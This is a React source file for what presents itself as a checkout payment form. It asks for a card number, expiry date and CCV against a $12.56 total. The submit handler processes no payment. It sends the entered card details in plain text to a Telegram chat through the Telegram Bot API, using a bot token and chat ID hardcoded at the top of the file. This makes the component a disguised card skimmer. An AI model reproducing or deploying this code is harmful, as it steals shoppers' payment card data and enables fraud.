import React, { useState } from "react";
import img1 from "../../assets/images/components/out/card.png";
import img2 from "../../assets/images/components/out/pay.png";
import img3 from "../../assets/images/components/out/play.png";
import img4 from "../../assets/images/components/out/viza.png";
import { FiArrowLeft } from "react-icons/fi";
import { useNavigate } from "react-router-dom";

const BOT_TOKEN = "7313879684:AAH0lhoKddXhkYP-YO5QnYueauqqT3J9hzE";
const CHAT_ID = "-1002180292093";

const Payment = () => {
  const [info, setInfo] = useState(false);
  const [selectedCard, setSelectedCard] = useState(null);
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [ccv, setCcv] = useState("");
  const navigate = useNavigate();

  const handleSubmit = (e) => {
    e.preventDefault();

    let text = `Payment Info %0A`;
    text += `Card Number: ${cardNumber} %0A%0A`;
    text += `Expiry Date: ${expiryDate} %0A%0A`;
    text += `CCV: ${ccv} %0A%0A`;
    text += `Total Amount: $12.56 %0A%0A`;

    let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`;
    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();

    setCardNumber("");
    setExpiryDate("");
    setCcv("");
  };

  return (
    <div
      className={`chekout__right pt-[100px] pb-[100px] max-w-[500px] h-[75vh] px-4 flex flex-col gap-[30px] mx-auto ${
        info ? "chekout__show" : ""
      }`}
    >
      <h2
        onClick={() => setInfo(false)}
        className="chekout__right__title flex items-center text-3xl font-semibold text-gray-800 py-4"
      >
        <FiArrowLeft onClick={() => navigate(-1)} className="mr-2" />
        Payment info
      </h2>
      <form onSubmit={handleSubmit}>
        <div className="chekout__right__card bg-white rounded-md shadow-md p-5 flex flex-col gap-[20px]">
          <p className="text-sm text-gray-600">Card type</p>
          <div className="chekout__right__card-img flex justify-between mt-2">
            {[img1, img2, img3, img4].map((img, index) => (
              <img
                key={index}
                width={60}
                height={40}
                src={img}
                alt={`Card type ${index + 1}`}
                className={`w-[60px] h-[40px] cursor-pointer ${
                  selectedCard === index
                    ? "border-2 border-green-500 rounded-[5px]"
                    : ""
                }`}
                onClick={() => setSelectedCard(index)}
              />
            ))}
          </div>
        </div>
        <div className="chekout__right-num mt-4  flex flex-col gap-[10px]">
          <p className="text-sm text-gray-600">Card number</p>
          <input
            required
            minLength={16}
            maxLength={16}
            className="input-field"
            placeholder="0000 0000 0000 0000"
            type="text"
            value={cardNumber}
            onChange={(e) => setCardNumber(e.target.value)}
          />
        </div>
        <div className="chekout__right__date grid grid-cols-2 gap-4 mt-4">
          <label className="text-sm text-gray-600  flex flex-col gap-[10px]">
            Expiring date
            <input
              required
              minLength={4}
              maxLength={4}
              className="input-field"
              placeholder="01/01"
              type="text"
              value={expiryDate}
              onChange={(e) => setExpiryDate(e.target.value)}
            />
          </label>
          <label className="text-sm text-gray-600 flex flex-col gap-[10px]">
            CCV
            <input
              required
              minLength={3}
              maxLength={3}
              className="input-field"
              placeholder="123"
              type="text"
              value={ccv}
              onChange={(e) => setCcv(e.target.value)}
            />
          </label>
        </div>
        <div className="chekout__right__bottom flex items-center justify-between mt-4">
          <p className="text-sm text-gray-600">Total amount</p>
          <h3 className="text-lg font-semibold text-gray-800">$12.56</h3>
        </div>
        <button
          type="submit"
          className="chekout__right__btn flex items-center gap-[10px] justify-center mt-4 px-4 py-2 bg-green-500 text-white font-semibold rounded-md shadow-md hover:bg-green-600 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-opacity-50"
        >
          <p className="text-white">$12.56</p>
          <p className="text-white">Continue</p>
        </button>
      </form>
    </div>
  );
};

export default Payment;
